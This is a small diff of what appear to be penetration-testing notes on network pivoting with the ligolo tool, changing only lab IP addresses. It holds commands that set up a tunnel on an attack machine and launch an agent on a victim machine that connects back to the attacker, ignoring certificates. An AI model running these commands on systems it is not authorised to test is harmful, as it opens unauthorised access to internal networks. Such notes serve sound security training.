@@ -15,11 +15,11 @@ Lets define some variables for the example:
 - Setup in attack machine:
 	# sudo ip tuntap add user $USER mode tun ligolo
 	# sudo ip link set ligolo up
-	# sudo ip route add 10.4.216.0/24 dev ligolo (Here we specify that the network route should go through our ligolo device)
+	# sudo ip route add 172.16.96.0/24 dev ligolo (Here we specify that the network route should go through our ligolo device)
 	# ./proxy -selfcert (Note the port from the output: Listening on 0.0.0.0:11601)
 
 - Launch agent in victim machine:
-	# ./agent -connect 192.168.45.197:11601 -ignore-cert
+	# ./agent -connect 192.168.45.201:11601 -ignore-cert
 
 - In ligolo console:
 	# session
